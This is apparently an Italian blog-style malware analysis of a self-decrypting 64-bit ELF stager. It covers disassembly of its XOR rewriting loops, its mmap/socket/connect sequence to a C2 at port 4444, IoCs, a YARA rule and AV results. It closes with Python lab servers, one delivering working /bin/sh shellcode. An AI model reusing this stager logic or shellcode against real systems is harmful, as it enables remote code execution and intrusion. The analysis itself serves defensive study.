@@ -1,0 +1,349 @@
+;questo campione ELF a 64-bit ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f rappresenta un esempio interessante di malware auto-riscrivente, progettato per evolversi in più stadi prima di eseguire il payload finale, cosa che lo rende differente dal precedente campione (vedere post Alien Code).
+
+file ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, no section header
+
+;è un binario ELF 64-bit statico senza section header: il file è un eseguibile puro, simboli e sezioni sono stati strippati per complicare l’analisi.
+
+-----------------------------------------------------------------------------
+
+objdump -D -M intel ./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+
+./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f: file format elf64-x86-64
+
+-----------------------------------------------------------------------------
+
+strings ./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+h5tH1X'H-
+<w9!
++oOf
+[_EA.
+Ox@>
+M D-+
+@WGo
+@OBU
+3F:`
+|5V:`J
+
+-----------------------------------------------------------------------------
+
+readelf -l ./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+
+Elf file type is EXEC (Executable file)
+Entry point 0x400078
+There is 1 program header, starting at offset 64
+
+Program Headers:
+Type Offset VirtAddr PhysAddr
+FileSiz MemSiz Flags Align
+LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000
+0x000000000000028f 0x00000000000004a6 RWE 0x1000
+
+readelf -s ./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+
+Dynamic symbol information is not available for displaying symbols.
+
+;il binario non presenta intestazioni classiche (niente symbol table, niente section headers) ed è interamente statico. Questo rende l'analisi più complessa, poiché l'autore ha deliberatamente ridotto i metadati disponibili per i tool standard (es. readelf, strings).
+
+-----------------------------------------------------------------------------
+
+;il flusso del malware può essere riassunto in tre fasi principali:
+
+;autoriscrittura a loop --> il codice iniziale si decifra/riscrive progressivamente da solo.
+;stadio intermedio --> il malware alloca memoria eseguibile e crea una connessione verso un C2 remoto.
+;stadio finale --> riceve shellcode dal C2 e lo esegue in memoria.
+
+;il malware non parte subito con un payload, ma si auto-decifra e riscrive in più passaggi, rendendo difficile una semplice analisi statica.
+
+[0x00400078]> afl
+0x00400078 3 41 entry0
+[0x00400078]> pdf
+
+0x00400078 xor rcx, rcx
+0x0040007b sub rcx, 0xffffffffffffffc2
+0x00400082 lea rax, [entry0]
+0x00400089 movabs rbx, 0x743568a974dec1
+0x00400093 xor qword [rax + 0x27], rbx
+0x00400097 sub rax, 0xfffffffffffffff8
+0x0040009d loop 0x400093
+0x0040009f xor dh, al
+
+;qui osserviamo il primo loop che esegue un ciclo di autoriscrittura: al termine ritorna all'indirizzo 0x400093, dove inizia a decifrare e generare il loop successivo. Questo processo si ripete più volte, con ogni loop che produce quello seguente, fino ad arrivare al corpo finale del malware.
+
+;questo primo blocco inizia con un registro rcx usato come contatore per il loop. L'istruzione xor [rax+0x27], rbx mostra un meccanismo di decifratura/autoriscrittura del codice stesso. Il malware costruisce altri loop in cascata, ognuno dei quali decifra/riscrive un segmento successivo. Questo comportamento "a cipolla" rende difficile ricostruire subito il corpo del malware.
+
+0x0040009d loop 0x400093
+0x0040009f xor rcx,rcx
+0x004000a2 sub rcx,0xffffffffffffffc7
+0x004000a9 lea rax,[rip+0xffffffffffffffef] # 0x40009f
+0x004000b0 movabs rbx,0x4d13123cb7cdc053
+0x004000ba xor QWORD PTR [rax+0x27],rbx
+0x004000be sub rax,0xfffffffffffffff8
+0x004000c4 loop 0x4000ba
+
+;questo è un altro stadio di autoriscrittura. Si nota lo stesso pattern: un contatore (rcx), una chiave a 64-bit caricata in rbx, e l'operazione xor su memoria. L'indirizzo target cambia, permettendo di decifrare altre porzioni di codice.
+
+in gdb
+
+(gdb) dump memory malware_code.bin 0x00000000004001fe 0x000000000040027e
+
+;per dumpare il codice del malware finale.
+
+(gdb) gcore dump.core
+warning: Memory read failed for corefile section, 4096 bytes at 0xffffffffff600000.
+Saved corefile dump.core
+
+;per generare un core dump del processo attualmente attaccato o in esecuzione.
+
+;syscall sequence
+
+;dopo diversi loop di autoriscrittura, il malware esegue il vero payload.
+
+(gdb) disass $rip, +200
+Dump of assembler code from 0x4001fe to 0x4002c6:
+=> 0x00000000004001fe: xor rdi,rdi
+0x0000000000400201: push 0x9
+0x0000000000400203: pop rax
+0x0000000000400204: cdq
+0x0000000000400205: mov dh,0x10
+0x0000000000400207: mov rsi,rdx
+0x000000000040020a: xor r9,r9
+0x000000000040020d: push 0x22
+0x000000000040020f: pop r10
+0x0000000000400211: mov dl,0x7
+0x0000000000400213: syscall
+
+;mmap: alloca memoria RWE per ospitare codice eseguibile scaricato dal C2. L'uso diretto di syscall con parametri preparati nei registri conferma l'assenza di librerie.
+
+0x0000000000400215: test rax,rax
+0x0000000000400218: js 0x40026b
+0x000000000040021a: push 0xa
+0x000000000040021c: pop r9
+0x000000000040021e: push rax
+0x000000000040021f: push 0x29
+0x0000000000400221: pop rax
+0x0000000000400222: cdq
+0x0000000000400223: push 0x2
+0x0000000000400225: pop rdi
+0x0000000000400226: push 0x1
+0x0000000000400228: pop rsi
+0x0000000000400229: syscall
+
+;socket: crea un socket TCP (AF_INET, SOCK_STREAM) per collegarsi al server remoto.
+
+0x000000000040022b: test rax,rax
+0x000000000040022e: js 0x40026b
+0x0000000000400230: xchg rdi,rax
+0x0000000000400232: movabs rcx,0x8020a8c05c110002
+0x000000000040023c: push rcx
+0x000000000040023d: mov rsi,rsp
+0x0000000000400240: push 0x10
+0x0000000000400242: pop rdx
+0x0000000000400243: push 0x2a
+0x0000000000400245: pop rax
+0x0000000000400246: syscall
+
+;connect: qui vediamo l'IP codificato 192.168.32.128 (0xc0a82080 in memoria, rappresentato in ordine little endian) e la porta 4444 (0x115c). È il C2 che fornisce la shellcode.
+
+0x0000000000400248: pop rcx
+0x0000000000400249: test rax,rax
+0x000000000040024c: jns 0x400273
+0x000000000040024e: dec r9
+0x0000000000400251: je 0x40026b
+0x0000000000400253: push rdi
+0x0000000000400254: push 0x23
+0x0000000000400256: pop rax
+0x0000000000400257: push 0x0
+0x0000000000400259: push 0x5
+0x000000000040025b: mov rdi,rsp
+0x000000000040025e: xor rsi,rsi
+0x0000000000400261: syscall
+
+;nanosleep: se la connessione fallisce, attende prima di riprovare. Questo rende il malware più stealth e resiliente.
+
+0x0000000000400263: pop rcx
+0x0000000000400264: pop rcx
+0x0000000000400265: pop rdi
+0x0000000000400266: test rax,rax
+0x0000000000400269: jns 0x400232
+0x000000000040026b: push 0x3c
+0x000000000040026d: pop rax
+0x000000000040026e: push 0x1
+0x0000000000400270: pop rdi
+0x0000000000400271: syscall
+
+;exit: se tutti i tentativi falliscono, termina il processo.
+
+0x0000000000400273: pop rsi
+0x0000000000400274: push 0x7e
+0x0000000000400276: pop rdx
+0x0000000000400277: syscall
+0x0000000000400279: test rax,rax
+0x000000000040027c: js 0x40026b
+0x000000000040027e: jmp rsi
+
+;jump: trasferisce l'esecuzione alla shellcode scaricata dal server remoto. Questo è il cuore del malware: il payload vero e proprio non è nel binario, ma viene scaricato a runtime dal C2.
+
+-----------------------------------------------------------------------------
+
+;Indicatori di Compromissione (IoC)
+
+;hash campione
+;ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+
+;connessione C2
+;IP: 192.168.32.128
+;porta: 4444
+
+;pattern codice autoriscrivente
+;sequenze ripetute di movabs + xor qword [rax+X], rbx
+
+;syscall sequence sospetta
+;mmap → socket → connect → nanosleep → exec shellcode
+
+;gli IoC principali riguardano l'hash, l'IP/porta del C2, le sequenze autoriscriventi e le syscall tipiche del malware. La regola YARA fornisce un buon pattern statico per la detection.
+
+rule Looper_Malware
+{
+ meta:
+  author = "HCF"
+  description = "Rileva il malware ELF Looper autorewriting"
+
+ strings:
+  // pattern statico dell'entry point ricavato da Radare2
+  $entry_bytes = { 7A C1 DE 74 A9 68 35 74 }
+ condition:
+  uint32(0) == 0x464C457F and // ELF magic
+  $entry_bytes
+}
+
+yara Looper.yar ./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+Looper_Malware ./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+
+-----------------------------------------------------------------------------
+
+;rilevazione AV
+
+clamscan ./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+
+/home/remnux/Desktop/FollowTheWhiteRabbit/Linux-Malware-Samples/quarantena/ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f: OK
+
+----------- SCAN SUMMARY -----------
+Known viruses: 8675266
+Engine version: 0.103.6
+Scanned directories: 0
+Scanned files: 1
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 19.310 sec (0 m 19 s)
+Start Date: 2025:09:02 05:26:29
+End Date: 2025:09:02 05:26:48
+
+;nessuna rilevazione con clamscan
+
+<img src="https://spaghetti-hacker.github.io/looper.png" class="full-img">
+
+;questa schermata mostra l'analisi su VirusTotal di un file ELF a 64 bit di dimensioni molto ridotte (655 byte).
+
+;i motori AV lo classificano in maniera abbastanza coerente con etichette che ruotano attorno a:
+
+;Trojan/Shellcode
+;Marte / Shelma (famiglie note di shellcode Linux rilevati genericamente)
+;Backdoor / Exploit payloads (alcuni motori lo vedono come codice prodotto da Metasploit o simili)
+
+-----------------------------------------------------------------------------
+
+;conclusione
+
+;questo campione ELF è un esempio di malware modulare e evasivo.
+;le caratteristiche chiave osservate sono:
+
+;tecnica di autoriscrittura a loop, usata come anti-analisi.
+;assenza di sezioni e simboli, per confondere i tool statici.
+;caricamento dinamico di shellcode da un C2 remoto, che consente all'attaccante di modificare i payload senza alterare il binario principale.
+
+;mancata rilevazione da parte di ClamAV, dimostrando che alle volte le firme statiche tradizionali non sono efficaci contro questo approccio. Questo tipo di malware mostra chiaramente come gli attaccanti stiano investendo in tecniche polimorfiche e runtime per aggirare controlli statici e AV signature-based.
+
+-----------------------------------------------------------------------------
+
+;per verificare il comportamento del malware e osservare l'esecuzione della shellcode scaricata, sono stati creati due semplici server TCP in Python.
+
+;server 1: shellcode dummy (nop sled + int3)
+
+import socket
+
+HOST = "192.168.32.128"
+PORT = 4444
+
+# shellcode di esempio: 126 byte (qui solo NOP + int3 per sicurezza)
+shellcode = b"\x90" * 125 + b"\xcc" # 125 NOP + 1 INT3 breakpoint
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.bind((HOST, PORT))
+    s.listen(1)
+    print(f"[*] Listening on {HOST}:{PORT}")
+
+    conn, addr = s.accept()
+    with conn:
+    print(f"[*] Connection from {addr}")
+    conn.sendall(shellcode)
+    print("[*] Shellcode sent")
+
+;questo script invia solo nop e un int3 finale per generare un breakpoint e verificare che il malware esegua davvero la shellcode ricevuta.
+
+strace ./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+execve("./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f", ["./ae70ca051f29b058f18ed7aef33b75"...], 0x7ffe7878fb10 /* 49 vars */) = 0
+mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC|0x1000, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0) = 0x7f656afa1000
+socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.32.128")}, 16) = 0
+read(3, "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"..., 126) = 126
+--- SIGTRAP {si_signo=SIGTRAP, si_code=SI_KERNEL} ---
++++ killed by SIGTRAP (core dumped) +++
+Trace/breakpoint trap (core dumped)
+
+;qui vediamo chiaramente le syscall principali: mmap (alloca memoria RWE), socket e connect al server Python, read dei 126 byte inviati, e infine l'esecuzione che termina con un SIGTRAP, come previsto dal byte int3 (\xcc).
+
+-----------------------------------------------------------------------------
+
+;server 2: shellcode realistica (/bin/sh)
+
+import socket
+
+HOST = "192.168.32.128"
+PORT = 4444
+
+shellcode = (
+b"\x48\x31\xf6" # xor rsi,rsi
+b"\x56" # push rsi
+b"\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68" # mov rdi, '/bin//sh'
+b"\x57" # push rdi
+b"\x54" # push rsp
+b"\x5f" # pop rdi
+b"\x48\x31\xd2" # xor rdx,rdx
+b"\x48\x31\xc0" # xor rax,rax
+b"\xb0\x3b" # mov al, 59
+b"\x0f\x05" # syscall execve
+b"\x90" * (126 - 25) # NOP padding fino a 126 byte
+)
+
+with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((HOST, PORT))
+    s.listen(1)
+    print(f"[*] Listening on {HOST}:{PORT}")
+
+    conn, addr = s.accept()
+with conn:
+    print(f"[*] Connection from {addr}")
+    conn.sendall(shellcode)
+    print("[*] Shellcode sent")
+
+python3 server2.py
+[*] Listening on 192.168.32.128:4444
+[*] Connection from ('192.168.32.128', 49194)
+[*] Shellcode sent
+
+./ae70ca051f29b058f18ed7aef33b750ddec69d05d08801cf3f99b121e41c0c4f
+$ whoami
+remnux
